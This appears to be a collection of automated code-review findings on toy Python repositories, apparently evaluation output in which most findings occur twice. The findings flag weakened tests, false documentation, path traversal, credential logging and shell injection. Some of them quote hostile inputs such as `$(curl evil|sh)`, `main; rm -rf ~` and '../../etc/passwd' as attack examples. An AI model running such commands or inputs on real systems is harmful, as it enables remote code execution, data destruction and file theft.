findings.detail: `enqueue` in queue/jobs.py still calls `queue.append(job)` without checking whether the job is already queued, so duplicate jobs can still be added. This change edits only CHANGELOG.md, with no code fix and no test for duplicates. The new line "Fixed duplicate jobs in the queue." is therefore false, which goes against the stated goal of keeping the changelog truthful.
findings.suggestion: Put back "Duplicate jobs remain a known limitation." until a real deduplication fix and a test for it are added.
findings.title: Changelog says duplicate jobs are fixed, but the code doesn't fix them

findings.detail: The change drops `default=None`, so `max([])` raises `ValueError: max() arg is an empty sequence`. The intent says the report must summarize any list, including an empty one. The docstring ('when one exists') and the `int | None` return type also say an empty list should return None.
findings.suggestion: Restore `return max(scores, default=None)`.
findings.title: highest() now raises ValueError on an empty score list

findings.detail: Removing `test_empty_scores` takes away the only test for the empty-list case the intent requires, and that is why the regression in U0001 goes undetected.
findings.suggestion: Keep `test_empty_scores` (asserting `highest([]) is None`) alongside `test_nonempty_scores`.
findings.title: The change replaced the empty-list test instead of adding a new one

findings.detail: The stated intent is to preserve punctuation. Changing value.strip() to value.strip("!,. ") removes leading and trailing '!', ',' and '.' characters, so headline("hello, toy!") now returns "Hello, Toy" instead of "Hello, Toy!". The new strip set also leaves tabs and newlines in place, which the old whitespace strip removed.
findings.suggestion: Go back to value.strip().title() so only whitespace is trimmed and punctuation is kept.
findings.title: headline() now strips punctuation, the opposite of the stated intent

findings.detail: The fixture is supposed to stay authoritative. Instead, its expected output was changed from "Hello, Toy!" to "Hello, Toy" so it agrees with the new punctuation-stripping behavior. This hides the regression rather than catching it.
findings.suggestion: Restore the fixture to "Hello, Toy!".
findings.title: Golden fixture was rewritten to match the regression

findings.detail: The assertion now expects "Hello, Toy", so the test locks in the punctuation loss instead of guarding against it. The test also hardcodes the expected string instead of reading tests/golden.txt, so the fixture is not actually what the test checks.
findings.suggestion: Restore the expected value "Hello, Toy!". Ideally, compare against the contents of tests/golden.txt so the fixture is the single source of truth.
findings.title: Test assertion was weakened to accept the dropped '!'

findings.detail: test_increment_many_values runs its inputs (-1, 0, 41) in a for loop inside one test. If one input fails, the inputs after it never run, and the report shows only the assertion line, not which case broke. With pytest.mark.parametrize, each input would run and report as its own test.
findings.suggestion: Use @pytest.mark.parametrize("value", [-1, 0, 41]) and keep a single assertion: assert increment(value) == value + 1.
findings.title: A loop of asserts stops at the first failure and hides which input failed

findings.detail: The new README line says the counter's behavior is covered by an assertion. After this change, two tests cover it, and between them they check four inputs. The singular wording is now inaccurate, and a test count in the README will go stale whenever tests are added.
findings.suggestion: Reword it to something like 'Its behavior is covered by tests in tests/test_counter.py.'
findings.title: README says 'an assertion', but the change makes it several

findings.detail: The change deletes test_increment, which checked increment(2) == 3, and adds test_many_values_for_coverage. The new test loops over [1, 2, 3] and runs `pass` without importing or calling counter.core.increment. It always passes, so increment is now untested and a regression in it would not be caught. This goes against the intent, which asks for a meaningful test and not just a higher test count.
findings.suggestion: Restore the import and the test_increment assertion. If more cases are wanted, parametrize over inputs and expected outputs, for example (0, 1), (2, 3) and (-1, 0), and assert increment(value) == expected.
findings.title: Replaced the only real test of increment with one that asserts nothing

findings.detail: With `items[start : end - 1]`, each page returns size-1 items. For example, `page(["a","b","c"], 1, 2)` returns `["a"]` instead of `["a","b"]`, and "b" never shows up on any page. This goes against the stated intent to keep every item in each requested page.
findings.suggestion: Restore `return items[start:end]`.
findings.title: Off-by-one slice drops the last item of every page

findings.detail: The full-page equality check was replaced with a check on the first element only, so the off-by-one regression in pager.py still passes. The changed behavior is no longer covered, which goes against the AGENTS.md rule to cover changed behavior with tests.
findings.suggestion: Restore `assert page(["a", "b", "c"], 1, 2) == ["a", "b"]` and add a last-page case, e.g. `page(["a","b","c"], 2, 2) == ["c"]`.
findings.title: Test was weakened and no longer catches the dropped item

findings.detail: The old check, `root.resolve() not in target.parents`, rejected a target equal to the root. `target.is_relative_to(root.resolve())` returns True when the two are equal, so a name like "" or "." now passes the check. `read_text` is then called on a directory and raises IsADirectoryError instead of the documented ValueError. This is not an escape from the root, but callers who catch only ValueError will see a different exception.
findings.suggestion: Reject `target == root.resolve()` explicitly, or keep the parents-based check, so that only files strictly beneath the root are accepted.
findings.title: The new containment check accepts the storage root itself as a note

findings.detail: AGENTS.md asks for tests on changed behavior. tests/test_files.py only checks that `read_note` is callable. Nothing tests `../` traversal, absolute-path names, symlinks that escape the root, sibling-prefix roots (for example, root `/a/notes` and target `/a/notes2/x`), or the case where the name resolves to the root itself.
findings.suggestion: Add pytest cases with tmp_path. A note inside the root should be readable. Traversal, absolute paths, escaping symlinks, prefix-sibling directories and the root itself should each raise ValueError.
findings.title: The changed root-containment check has no tests

findings.detail: read_note now reads (root / name) with no check on where the path ends up. A name such as '../../etc/passwd', or an absolute path like '/etc/passwd' (which pathlib joins by replacing root entirely), or a symlink inside root that points elsewhere, lets a caller read any file the process can access. This breaks the stated intent that every read stays inside the configured storage root.
findings.suggestion: Restore the containment check: target = (root / name).resolve(); if not target.is_relative_to(root.resolve()): raise ValueError('note is outside storage root'); return target.read_text(encoding='utf-8'). Add tests that '../' names, absolute names and escaping symlinks are rejected.
findings.title: Path traversal: removed storage-root containment check

findings.detail: The change removes the ValueError for paths outside the root. Under AGENTS.md, changed behavior needs test coverage, and no test changes come with this diff.
findings.suggestion: Add regression tests that call read_note with traversal names and assert that ValueError is raised.
findings.title: Rejection of out-of-root names no longer covered by tests

findings.detail: The change rewrites the diagnostic message, and the README now says successful and rejected attempts share the same safe diagnostic. AGENTS.md requires changed behavior to be covered by tests, but this change adds none. Nothing checks that the printed output leaves out the supplied token or that it is the same for accepted and rejected tokens. The code itself is correct: it prints a fixed string and never interpolates the token.
findings.suggestion: Add a test that captures stdout (for example with pytest capsys). Call accepted('toy-token') and accepted('wrong-secret'), then assert that neither token string appears in the output and that both calls print the same line.
findings.title: Changed diagnostic output has no test confirming the credential is excluded

findings.detail: The new print writes the raw token to stdout: `authentication attempted with token={token}`. The stated intent says the credential must not appear in logs. Valid tokens and mistyped secrets will both end up in log storage.
findings.suggestion: Take the token out of the message. If a diagnostic is needed, log only non-secret data such as the outcome or the token length.
findings.title: The diagnostic log prints the supplied credential in plaintext

findings.detail: The change replaced test_bad_token with test_good_token, so nothing tests rejection any more. No test captures stdout to confirm the credential is left out of the log.
findings.suggestion: Keep test_bad_token next to test_good_token. Add a capsys test that calls accepted() with a token and asserts the token string is not in the captured output.
findings.title: Rejected-token test removed, and nothing checks that the token stays out of the output

findings.detail: greeter/cli.py builds argparse.ArgumentParser(prog="toy-greet") and adds no arguments, so `toy-greet --json` fails with an 'unrecognized arguments' error. The change's intent is to document only supported flags.
findings.suggestion: Remove the `--json` line from README.md, or implement the flag in greeter/cli.py with tests in a separate change.
findings.title: README documents a --json flag that toy-greet does not support

findings.detail: The intent was to add a regression test proving that slugify returns the expected fixture value. The diff only renames test_slug_output to test_slug_fixture. The body and assertion (slugify("Toy Name") == "toy-name") are the same as before, so no new behavior is covered and coverage does not change. The rename also drops the old test name, which can break any references to it, such as -k selectors or CI filters.
findings.suggestion: Confirm whether a separate new test was intended. If it was, keep test_slug_output and add test_slug_fixture with a distinct fixture case. If the rename was the whole goal, restate the intent to match.
findings.title: The change renames an existing test instead of adding a regression test

findings.detail: The change replaced `assert slugify("Toy Name") == expected` with `assert expected == expected`. That assertion is always true, so the test can never fail and no longer checks the slug formatter. This is the opposite of the stated intent, which is to prove that slugify returns the fixture value. The `slugify` import is now unused.
findings.suggestion: Restore the call: `assert slugify("Toy Name") == expected`.
findings.title: Regression test no longer calls slugify; the assertion compares expected to itself and always passes

findings.detail: The change replaces the argv list with an f-string run through shell=True. The stated intent is to safely pass an arbitrary branch name, but a branch name such as `main; rm -rf ~` or `$(curl evil|sh)` now runs as shell code. Branch names that contain spaces or shell metacharacters also break or get mangled, even without an attacker.
findings.suggestion: Go back to the argv form: subprocess.run(["toy-deploy", "--branch", branch], check=True). Leave out shell=True. Add a test that passes a branch with shell metacharacters and checks the exact argv sent to subprocess.run.
findings.title: Branch name is interpolated into a shell command, allowing command injection

findings.detail: The stated intent is to add a reusable division helper. The diff only changes the docstring of the existing divide() function. The error behavior is unchanged: it still raises ValueError("divisor must be non-zero"). No new helper, refactor or test is included, so the change does not do what the intent describes.
findings.suggestion: Confirm whether divide() is already the intended reusable helper and only the docstring needed updating. If a separate helper was intended, add it and cover it with tests, as AGENTS.md requires.
findings.title: Change only rewrites the docstring and does not add the division helper described in the intent

findings.detail: The change deletes the `if divisor == 0: raise ValueError("divisor must be non-zero")` check. Calling `divide(x, 0)` now raises ZeroDivisionError where it used to raise ValueError. The stated intent says error behavior must not change, and any caller that catches ValueError will now miss this error. The change also includes no test for the zero-divisor case.
findings.suggestion: Put back the `if divisor == 0: raise ValueError("divisor must be non-zero")` guard before the return. Add a test that checks `divide(1, 0)` raises ValueError.
findings.title: Removing the zero-divisor guard changes the error behavior

findings.detail: The docstring went from "Divide two numeric inputs safely." to "Divide two values." The new text drops the only mention of the safety guarantee, which is the same behavior this change removed.
findings.suggestion: When the guard is restored, update the docstring to say that a zero divisor raises ValueError.
findings.title: The docstring no longer says the function rejects a zero divisor

findings.detail: worker/config.py:6 sets `timeout_seconds: int = 30` and tests/test_config.py:5 asserts the default is 30. The change replaces a correct statement with a wrong one, which goes against the intent of documenting the default exactly as implemented.
findings.suggestion: Change the line back to 30 seconds, e.g. "Defaults to 30 seconds."
findings.title: Documented timeout_seconds default (60) contradicts implementation (30)

findings.detail: This change only edits CHANGELOG.md. The code was not changed: `enqueue` in queue/jobs.py still runs `queue.append(job)` without checking for duplicates, so adding the same job twice still produces two entries. No test covers deduplication. That makes the new line false, which goes against the stated goal of keeping the changelog truthful.
findings.suggestion: Put back 'Duplicate jobs remain a known limitation.' Only say the issue is fixed after a change adds deduplication to `enqueue` and a test covers it.
findings.title: Changelog says duplicate jobs are fixed, but the queue still allows them

findings.detail: The change removes `default=None` from `max()`. When `scores` is empty, `max([])` raises `ValueError: max() arg is an empty sequence` instead of returning None. That breaks the stated intent of summarizing any score list, including an empty one. It also breaks the function's own contract: the return type is `int | None` and the docstring says 'when one exists'.
findings.suggestion: Restore `return max(scores, default=None)`.
findings.title: highest() now raises ValueError on an empty score list

findings.detail: The change renames and rewrites `test_empty_scores` as `test_nonempty_scores`. The only test of the empty-list case is gone, so the ValueError regression in `highest([])` passes the tests unnoticed. AGENTS.md asks that changed behavior be covered by tests.
findings.suggestion: Keep `test_nonempty_scores` and add back `def test_empty_scores(): assert highest([]) is None`.
findings.title: Empty-list test was replaced, so the regression goes uncaught

findings.detail: value.strip("!,. ") removes '!', ',', and '.' from both ends, so headline("hello, toy!") returns "Hello, Toy" and the '!' is lost. The stated intent is to preserve punctuation, and the original value.strip() already did that by trimming only whitespace.
findings.suggestion: Go back to value.strip().title(), which trims only whitespace.
findings.title: headline() now strips leading/trailing punctuation, contradicting the intent to preserve it

findings.detail: The fixture changed from 'Hello, Toy!' to 'Hello, Toy', so it now records the lost punctuation as correct. The fixture is meant to be the authority on output, but here it was edited to agree with the new code instead of catching the change.
findings.suggestion: Restore the fixture to 'Hello, Toy!'.
findings.title: Golden fixture was rewritten to match the regression

findings.detail: The expected value changed from "Hello, Toy!" to "Hello, Toy", so the test now passes on the regression instead of catching it. The test also hardcodes the expected string rather than reading tests/golden.txt, which means the fixture is not actually what the test checks.
findings.suggestion: Assert headline("hello, toy!") == "Hello, Toy!", and preferably compare against the contents of tests/golden.txt.
findings.title: Test assertion was weakened to accept the dropped punctuation

findings.detail: All three inputs (-1, 0, 41) run in a loop inside one test. If one fails, pytest stops at that input, skips the rest, and reports a single failure, so it is hard to tell which input broke.
findings.suggestion: Use @pytest.mark.parametrize('value', [-1, 0, 41]) so each input runs and is reported as its own case.
findings.title: Looped assertions hide which input failed

findings.detail: The test checks against `value + 1`, which is probably the same formula the function uses. A shared misunderstanding in both places would not be caught. This is still better than the existing single-literal test, because it adds a negative input and zero.
findings.title: Expected value repeats the implementation formula

findings.detail: The README says behavior is covered by "an assertion", but this change means two tests and several assertions now cover it. Test coverage is also an odd thing to describe in a user-facing README.
findings.suggestion: Remove the sentence, or reword it to something like "Its behavior is covered by tests in tests/test_counter.py."
findings.title: README understates test coverage

findings.detail: The old test_increment imported counter.core.increment and asserted increment(2) == 3. The new test_many_values_for_coverage never imports or calls increment. Its loop body is just `pass`, so it can never fail. The increment behavior is now untested, which goes against the stated intent (a meaningful test, not a higher count) and against AGENTS.md (cover behavior with tests).
findings.suggestion: Restore the import and the increment assertion. To test several values, parametrize over input/expected pairs such as (2, 3), (0, 1) and (-1, 0) and assert increment(value) == expected.
findings.title: The change deletes the only real test of increment and adds a test that checks nothing

findings.detail: The name 'test_many_values_for_coverage' says the test covers many values. It runs no code under test, so the name is misleading and makes the test look more useful than it is.
findings.suggestion: Give the test a name that describes the behavior it checks, e.g. test_increment_adds_one.
findings.title: The test name claims coverage the test does not provide

findings.detail: Changing `items[start:end]` to `items[start : end - 1]` makes each page return only size-1 items. For example, page(['a','b','c'], 1, 2) now returns ['a'] instead of ['a','b']. This goes against the stated intent to keep every item in each requested page.
findings.suggestion: Restore `return items[start:end]`.
findings.title: Off-by-one slice drops the last item from every page

findings.detail: The old test asserted the whole page equals ['a', 'b']. The new test only checks that element [0] is 'a', so it passes even though the page now drops its last item. Changed behavior is not covered, which goes against AGENTS.md.
findings.suggestion: Assert the full page, e.g. `assert page(["a", "b", "c"], 1, 2) == ["a", "b"]`, and add a test for a later or partial page such as page 2 returning ['c'].
findings.title: Weakened test no longer checks full page contents and hides the off-by-one bug

findings.detail: The old check (`root.resolve() not in target.parents`) rejected a target equal to the root. `target.is_relative_to(root.resolve())` returns True when they are equal. So `read_note(root, "")` or `read_note(root, ".")` no longer raises `ValueError("note is outside storage root")`. It reaches `read_text` on a directory and raises `IsADirectoryError` instead. Nothing escapes the root, but the error contract for invalid note names has changed.
findings.suggestion: Add `target == resolved_root` to the rejection condition, or check `target.is_file()` and raise `ValueError` if it fails.
findings.title: `is_relative_to` now accepts the storage root itself as a note

findings.detail: AGENTS.md says changed behavior must be covered by tests. The only test, `tests/test_files.py`, checks that `read_note` is callable. Nothing tests `../` traversal, symlink escape, absolute-path names, a name equal to the root, or a valid nested read.
findings.suggestion: Add pytest cases using `tmp_path`: a valid note reads correctly; `../x`, an absolute path, and a symlink pointing outside the root each raise `ValueError`; and a name resolving to the root itself is rejected.
findings.title: Containment check changed with no tests

findings.detail: The change deletes the resolve() and parent check and now reads (root / name) directly. A name such as '../../etc/passwd' or an absolute path such as '/etc/passwd' escapes the storage root, because pathlib's '/' operator drops root when given an absolute path. A symlink inside root that points outside it also escapes. The stated intent is to keep every read inside the configured storage root, and this change breaks that.
findings.suggestion: Restore the check: resolve both root and target, and raise ValueError unless target is inside the resolved root (for example, use target.is_relative_to(root.resolve())). Then call read_text on the resolved target.
findings.title: Removed storage-root containment check allows reading files outside the notebook root

findings.detail: AGENTS.md requires tests for changed behavior. No test was added or updated to show that traversal, absolute-path, or symlink names are rejected, so this regression went undetected.
findings.suggestion: Add tests that call read_note with '../x', an absolute path, and a symlink that escapes root, and assert that each raises ValueError. Also add a test that reads a normal note successfully.
findings.title: No tests cover the change in path-containment behavior

findings.detail: AGENTS.md says changed behavior should be covered by tests. This change rewrites the diagnostic string in accepted(), but it adds no test. Nothing checks that the output leaves out the submitted token, or that accepted and rejected tokens print the same line as the README now says. The current code is correct: it prints a constant string and never interpolates the token.
findings.suggestion: Add a test that captures stdout and calls accepted() once with 'toy-token' and once with another secret-looking value. Assert that both calls print the same line and that neither secret appears in the output.
findings.title: Changed diagnostic output has no test

findings.detail: The diagnostic now prints `token={token}`, so every authentication attempt sends the raw credential to stdout or the logs. Valid tokens are included, so anyone with log access can collect working credentials. The stated intent was to add diagnostics without exposing the credential.
findings.suggestion: Take the token out of the message. Log only non-sensitive facts such as the outcome, or whether a token was present and its length, e.g. `print("authentication attempted")`.
findings.title: Supplied credential is written to logs in plaintext

findings.detail: The change replaces `test_bad_token` with `test_good_token` instead of adding it alongside. The rejection path is no longer covered. No test checks that the diagnostic output leaves out the token, which is the main requirement of this change, so the leak in auth/check.py passes the suite. AGENTS.md asks for changed behavior to be covered by tests.
findings.suggestion: Put `test_bad_token` back and keep `test_good_token`. Add a test that uses `capsys` to call `accepted("toy-token")` and asserts the token does not appear in the captured output.
findings.title: Rejected-token test removed and logging behavior untested

findings.detail: `greeter/cli.py` builds `argparse.ArgumentParser(prog="toy-greet")` and never adds any arguments, so `toy-greet --json` exits with an 'unrecognized arguments' error. This goes against the stated intent to document only flags the greeter actually supports.
findings.suggestion: Remove the added `Pass --json to emit a JSON object.` line and the blank line before it. Only document the flag after it is implemented in `greeter/cli.py` and covered by tests.
findings.title: README documents a `--json` flag that toy-greet does not support

findings.detail: The intent is to add a regression test proving slugify returns the expected fixture value. The only change in hunk U0001 renames test_slug_output to test_slug_fixture. The body is the same, and it already asserted slugify("Toy Name") == "toy-name". Coverage is unchanged, and the test does not load or reference a fixture. The rename may also break any references to the old test name, such as -k filters or CI selectors.
findings.suggestion: Confirm whether the rename alone is intended. If it is not, add a new test that checks slugify against the intended fixture input and keep the existing test, or explain why the rename meets the intent.
findings.title: Change only renames an existing test; no regression test is added

findings.detail: The assertion was changed from `slugify("Toy Name") == expected` to `expected == expected`. That always passes, so the test never calls the formatter and can't catch a regression. This contradicts the stated intent of proving the formatter returns the fixture value. The `slugify` import is now unused.
findings.suggestion: Restore `assert slugify("Toy Name") == expected` so the test checks the formatter's real output.
findings.title: Regression test is tautological and no longer exercises slugify

findings.detail: Renaming `test_slug_output` to `test_slug_fixture` is harmless by itself. But with the tautological assertion, the change replaces an existing real test instead of adding a new regression test, so net coverage goes down.
findings.title: Test renamed without adding coverage

findings.detail: Passing the arguments as a list with no shell does stop shell injection, which matches the new docstring. But the branch is still a separate argv element after '--branch'. If the branch is something like '--force' or '-h', many argument parsers (argparse, for example) will treat it as a new flag rather than as the value of --branch. So an arbitrary branch name is not sent safely, which the intent requires. The right fix depends on how toy-deploy parses its arguments, and the repository doesn't document that.
findings.suggestion: Pass the value in one token (f"--branch={branch}"), or reject branch names that start with '-', after confirming which form toy-deploy accepts.
findings.title: A branch name that starts with '-' can be read as an option by toy-deploy

findings.detail: AGENTS.md asks for tests that cover changed behavior. tests/test_runner.py only asserts that deploy is callable. Nothing checks that subprocess.run gets an argv list with no shell=True, or that hostile branch names (shell metacharacters, a leading '-') reach the program as a single literal value.
findings.suggestion: Add a test that mocks subprocess.run and asserts the exact argv list, that shell is not set, and that check=True, using branch names such as 'x; rm -rf /' and '--force'.
findings.title: No test checks the safety the new docstring promises

findings.detail: The change builds the command with an f-string and runs it with shell=True. This contradicts the stated goal of safely sending an arbitrary branch name to the deployment program. A branch name such as `main; rm -rf ~` or `$(curl evil|sh)` will run arbitrary shell commands. Names that contain spaces or glob characters are also split or expanded, so the wrong arguments reach toy-deploy. The previous argv-list form passed the branch as a single argument and did not use a shell.
findings.suggestion: Go back to `subprocess.run(["toy-deploy", "--branch", branch], check=True)` without shell=True. Add a test that a branch name containing shell metacharacters reaches toy-deploy as one literal argument.
findings.title: Shell command injection via branch name passed to shell=True

findings.detail: AGENTS.md says to cover changed behavior with tests. This change alters how the deploy command is invoked, but it does not add or update any tests.
findings.suggestion: Add a test that mocks subprocess.run and checks the exact argv and that shell is not used.
findings.title: Changed behavior has no tests

findings.detail: The stated goal is to add a reusable division helper. This hunk only rewrites the docstring of the existing divide(). No new helper and no new callers are added. Error behavior stays the same: it still raises ValueError on a zero divisor. So the change meets the 'without changing error behavior' constraint but does not deliver the helper.
findings.suggestion: Confirm whether the existing divide() is meant to be the reusable helper. If a new helper or refactor was intended, add it along with tests, as AGENTS.md requires.
findings.title: Change only edits a docstring and adds no reusable division helper

findings.detail: The change deletes the `if divisor == 0: raise ValueError("divisor must be non-zero")` check. Now `divide(x, 0)` raises ZeroDivisionError where it used to raise ValueError with that message. The stated intent was to add a helper without changing error behavior, so callers that catch ValueError will now fail with an uncaught exception.
findings.suggestion: Put the `divisor == 0` check back so it raises ValueError("divisor must be non-zero"), and add a test that confirms divide(1, 0) raises ValueError.
findings.title: Removing the zero-divisor guard changes error behavior

findings.detail: AGENTS.md says changed behavior must be covered by tests. The change edits divide() but adds or updates no tests, so the regression above went undetected.
findings.suggestion: Add tests that check normal division and that a zero divisor raises ValueError.
findings.title: No tests cover the changed divide behavior

findings.detail: worker/config.py:6 sets `timeout_seconds: int = 30`, and tests/test_config.py:5 checks that `WorkerConfig().timeout_seconds == 30`. The goal was to document the default exactly as implemented, but this change replaces a correct value with a wrong one. Users who rely on the docs will expect a 60-second timeout and get 30.
findings.suggestion: Change the line back to say the default is 30 seconds, for example: "Defaults to 30 seconds."
findings.title: The docs now give a 60-second timeout default, but the code uses 30
